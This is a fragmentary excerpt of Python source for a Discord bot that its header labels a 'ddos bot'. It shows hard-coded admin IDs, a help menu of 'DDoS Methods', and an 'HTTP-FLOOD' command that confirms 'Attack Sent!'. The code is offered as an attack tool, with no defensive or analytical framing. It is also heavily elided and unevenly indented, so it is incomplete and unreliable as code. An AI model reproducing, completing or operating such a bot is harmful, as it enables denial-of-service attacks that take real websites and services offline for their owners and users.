...
# ROMEObot | Discord ddos bot v1.2 | ROMEO
#=====Import Module=====#
import os
try:
	import discord
...
admins  = [1091376547379814441]  #   ID users            
owners  = [1091376547379814441]  #          
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="𝐋𝐢 𝐙𝐚𝐧𝐝𝐲𝐚 Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        ...
        embed.set_footer(text = f"©{year_now} Copyright ROMEO.")
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"𝐋𝐢 𝐙𝐚𝐧𝐝𝐲𝐚 Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
